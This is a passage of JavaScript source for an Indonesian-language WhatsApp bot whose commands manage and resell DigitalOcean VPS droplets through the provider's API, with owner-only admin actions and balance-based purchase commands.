⭔ ${prefix}buysc
⭔ ${prefix}buyakn
⭔ ${prefix}buyvps
⭔ ${prefix}buysrv 
⭔ ${prefix}deposit
⭔ ${prefix}buyprem
⭔ ${prefix}buyowner
⭔ ${prefix}adminpanel
⭔ ${prefix}cekharga
⭔ ${prefix}payment
⭔ ${prefix}donasi
⭔ ${prefix}jasa
⭔ ${prefix}vps

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: textoto, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break 
case "vpsmenu":{
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
    const cvps = `*Hi @${sender.split("@")[0]} 👋*

╭─━─━─〘 *VPS MENU* 〙─━─━─━
│➵ ${prefix}deldroplet
│➵ ${prefix}svps / sendvps
│➵ ${prefix}sdomain / sendomain
│➵ ${prefix}listdroplet
│➵ ${prefix}cekdroplet
│➵ ${prefix}turnoff
│➵ ${prefix}turnon
│➵ ${prefix}sisadroplet
│➵ ${prefix}rebuild
│➵ ${prefix}restartvps
│➵ ${prefix}vps1g1c
│➵ ${prefix}vps2g1c
│➵ ${prefix}vps4g2c
│➵ ${prefix}vps8g4c
│
╰━─━〘 Powered By *@${owned.split("@")[0]}* 〙━─━

`
Biiofc.sendMessage(from, { text: cvps, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: hw })
}
break
case "sisadroplet":{
if (!isOwner) return reply(`Ga Usah Sok Asik Anjg`)
async function getDropletInfo() {
  try {
    const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
      headers: {
        Authorization: `Bearer ${API_TOKEN}`,
      },
    });

    const dropletsResponse = await axios.get('https://api.digitalocean.com/v2/droplets', {
      headers: {
        Authorization: `Bearer ${API_TOKEN}`,
      },
    });

    if (accountResponse.status === 200 && dropletsResponse.status === 200) {
      const dropletLimit = accountResponse.data.account.droplet_limit;
      const dropletsCount = dropletsResponse.data.droplets.length;
      const remainingDroplets = dropletLimit - dropletsCount;

      return {
        dropletLimit,
        remainingDroplets,
        totalDroplets: dropletsCount,
      };
    } else {
      throw new Error('Gagal mendapatkan data akun DigitalOcean atau droplet.');
    }
  } catch (error) {
    throw error;
  }
}

// Definisikan fungsi untuk mengeksekusi kasus "sisadroplet"
async function sisadropletHandler() {
  try {
    if (!isOwner) {
      return m.reply('Lu Siapanya Gua Anjg');
    }

    const dropletInfo = await getDropletInfo();
    m.reply(`*Sisa Droplet Yang Dapat Anda Pakai: ${dropletInfo.remainingDroplets}*

*Total Droplet Yang Sudah Terpakai: ${dropletInfo.totalDroplets}*`);
  } catch (error) {
    m.reply(`Terjadi kesalahan: ${error.message}`);
  }
}

  sisadropletHandler();
  break;
}
case "restartvps": {
    if (!isOwner) return reply(`Sok Asik Anjg`)
  let dropletId = args[0];
  if (!dropletId) return m.reply('ID droplet belum diberikan.');

  // Fungsi untuk melakukan restart VPS berdasarkan ID droplet
  const restartVPS = async (dropletId) => {
    try {
      const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`;

      const response = await fetch(apiUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        },
        body: JSON.stringify({
          type: 'reboot'
        })
      });

      if (response.ok) {
        const data = await response.json();
        return data.action;
      } else {
        const errorData = await response.json();
        reply(`Gagal melakukan restart VPS: ${errorData.message}`);
      }
    } catch (error) {
      reply('Terjadi kesalahan saat melakukan restart VPS:', error.message);
      reply('Terjadi kesalahan saat melakukan restart VPS.');
    }
  };

  restartVPS(dropletId)
    .then((action) => {
      reply(`Aksi restart VPS berhasil dimulai. Status aksi: ${action.status}`);
    })
    .catch((err) => {
      reply(err);
    });

  break;
}
case "turnoff": {
  if (!isOwner) return reply(`Sok Asik Anjg`);
  
  let dropletId = args[0];
  if (!dropletId) return m.reply('ID droplet belum diberikan.');

  async function turnOffDroplet() {
    try {
      const response = await axios.post(
        `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`,
        {
          type: 'power_off',
        },
        {
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${API_TOKEN}`,
          },
        }
      );

      if (response.status === 201 && response.data.action && response.data.action.status === 'in-progress') {
        reply('VPS (Droplet) sedang dimatikan...');
      } else {
        reply('Gagal mematikan VPS (Droplet).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat mematikan VPS (Droplet):', error.message);
    }
  }

  turnOffDroplet();
  break;
}

        
case "turnon": {
  if (!isOwner) return reply(`Sok Asik Anjg`);
  
  let dropletId = args[0];
  if (!dropletId) return m.reply('ID droplet belum diberikan.');

  async function turnOnDroplet() {
    try {
      const response = await axios.post(
        `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`,
        {
          type: 'power_on',
        },
        {
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${API_TOKEN}`,
          },
        }
      );

      if (response.status === 201 && response.data.action && response.data.action.status === 'in-progress') {
        reply('VPS (Droplet) sedang dihidupkan...');
      } else {
        reply('Gagal menghidupkan VPS (Droplet).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat menghidupkan VPS (Droplet):', error.message);
    }
  }

  turnOnDroplet();
  break;
}
        
        
case "rebuild": {
  if (!isOwner) return m.reply(`Lu Siapanya Gua Anjg Gausah Nyuruh Nyuruh Gua Anjg`);

  let dropletId = args[0];
  if (!dropletId) return m.reply('ID droplet belum diberikan.');

  let rebuildVPS = async () => {
    try {
      // Rebuild droplet menggunakan API DigitalOcean
      const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        },
        body: JSON.stringify({
          type: 'rebuild',
          image: 'ubuntu-20-04-x64' // Ganti dengan slug image yang ingin digunakan untuk rebuild (misal: 'ubuntu-18-04-x64')
        })
      });

      if (response.ok) {
        const data = await response.json();
        reply('Rebuild VPS berhasil dimulai. Status aksi:', data.action.status);

        // Mendapatkan informasi VPS setelah rebuild
        const vpsInfo = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${API_TOKEN}`
          }
        });

        if (vpsInfo.ok) {
          const vpsData = await vpsInfo.json();
          const droplet = vpsData.droplet;
          const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
          const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP';

          const textvps = `*VPS SUKSES REBUILD*\nIP VPS: ${ipAddress}\nSYSTEM IMAGE: ${droplet.image.slug}`;
          await sleep(60000) 
 Biiofc.sendMessage(m.chat, { text: textvps });
        } else {
          reply('Gagal mendapatkan informasi VPS setelah rebuild.');
        }
      } else {
        const errorData = await response.json();
        reply('Gagal melakukan rebuild VPS:', errorData.message);
      }
    } catch (error) {
      reply('Terjadi kesalahan saat melakukan rebuild VPS:', error);
    }
  };

  rebuildVPS();
}
break;

        case "deldroplet": {
  if (!isOwner) return m.reply('Maaf, command ini hanya untuk pemilik.');

  let dropletId = args[0];
  if (!dropletId) return m.reply('ID droplet belum diberikan.');

  let deleteDroplet = async () => {
    try {
      let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'DELETE',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        }
      });

      if (response.ok) {
        m.reply('Droplet berhasil dihapus.');
      } else {
        const errorData = await response.json();
        throw new Error(`Gagal menghapus droplet: ${errorData.message}`);
      }
    } catch (error) {
      console.error('Terjadi kesalahan saat menghapus droplet:', error);
      m.reply('Terjadi kesalahan saat menghapus droplet.');
    }
  };

  deleteDroplet();

  break;
}
 case "listdroplet": {
  if (!isOwner) return m.reply("Anda bukan pemilik.");

  try {
    const getDroplets = async () => {
      try {
        const response = await fetch('https://api.digitalocean.com/v2/droplets', {
          headers: {
            Authorization: "Bearer " + API_TOKEN
          }
        });
        const data = await response.json();
        return data.droplets || [];
      } catch (error) {
        reply('Error fetching droplets: ' + error);
        return [];
      }
    };

    getDroplets().then(droplets => {
      let totalvps = droplets.length;
      let mesej = `List Droplet Digital Ocean Anda: ${totalvps}\n\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n`;

      if (droplets.length === 0) {
        mesej += 'Tidak ada Droplet yang tersedia.';
      } else {
        droplets.forEach(droplet => {
          const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
          const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP';
          mesej += `- Droplet Id: ${droplet.id}\n- Hostname: ${droplet.name}\n- Username Login: root\n- IP: ${ipAddress}\n- Ram: ${droplet.memory} MB\n- Cpu: ${droplet.vcpus} CPU\n- OS: ${droplet.image.distribution}\n- Storage: ${droplet.disk} GB\n- Status: ${droplet.status}\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n`;
        });
      }
      Biiofc.sendMessage(m.chat, { text: mesej });
    });
  } catch (err) {
    reply('Terjadi kesalahan saat mengambil data droplet: ' + err);
  }

  break;
}
    
 case "cekdroplet": {
  if (!isOwner) return m.reply(`Ngapain? Kepo Amat Dah`);

  let dropletId = args[0];
  if (!dropletId) return m.reply('ID droplet belum diberikan.');

  // Mendapatkan informasi droplet (VPS) berdasarkan ID
  const getDropletInfo = async (dropletId) => {
    try {
      const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}`;
      const response = await fetch(apiUrl, {
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        }
      });

      if (response.ok) {
        const data = await response.json();
        const droplet = data.droplet;
        const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
        const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP';
        const vpsRam = droplet.memory / 1024;

        return {
          dropletid: droplet.id,
          username: droplet.name,
          ip: ipAddress,
          ram: `${vpsRam} GB`,
          os: droplet.image.distribution,
          cpu: droplet.vcpus > 1 ? `${droplet.vcpus} vCPU` : `${droplet.vcpus} vCPUs`,
          storage: droplet.disk,
          status: droplet.status // Menambahkan status VPS
        };
      } else {
        const errorData = await response.json();
        throw new Error(`Gagal memeriksa detail droplet: ${errorData.message}`);
      }
    } catch (error) {
      reply('Terjadi kesalahan saat memeriksa detail droplet:', error.message);
      throw new Error('Terjadi kesalahan saat memeriksa detail droplet.');
    }
  };

  getDropletInfo(dropletId)
    .then((info) => {
      let textku = `*DETAIL VPS ANDA*\nDroplet Id: ${info.dropletid}\nHostname: ${info.username}\nIpv4 : ${info.ip}\nRam : ${info.ram}\nOS : ${info.os}\nCPU: ${info.cpu}\nStorage: ${info.storage}\nStatus : ${info.status}`;
      Biiofc.sendMessage(m.chat, { text: textku });
    })
    .catch((err) => {
      reply(err);
      Biiofc.sendMessage(m.chat, { text: 'Terjadi kesalahan saat memeriksa detail VPS.' });
    });

  break;
}
       
        
    case "buypaketvps1g1c": {
if (cekSaldo(sender,db_saldo) < 20000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp20.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let hostname = args[0];
if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-1gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
minSaldo(sender, 20000, db_saldo)
break

    case "buypaketvps2g1c": {
if (cekSaldo(sender,db_saldo) < 25000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp25.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-2gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
minSaldo(sender, 25000, db_saldo)
break  
 
    case "buypaketvps2g2c": {
if (cekSaldo(sender,db_saldo) < 30000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp30.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-2gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
minSaldo(sender, 30000, db_saldo)
break      
    case "buypaketvps4g2c": {
if (cekSaldo(sender,db_saldo) < 45000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp45.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-4gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
minSaldo(sender, 45000, db_saldo)
break        
     case "buypaketvps8g4c": {
if (cekSaldo(sender,db_saldo) < 55000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp55.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-4vcpu-8gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
minSaldo(sender, 55000, db_saldo)
break
    case "vps1g1c": {
if (!isOwner) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
let hostname = args[0];
if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-1gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break

    case "vps2g1c": {
  if (!isOwner) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-2gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break  
 
    case "vps2g2c": {
  if (!isOwner) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-2gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break      
    case "vps4g2c": {
  if (!isOwner) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-4gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break        
     case "vps8g4c": {
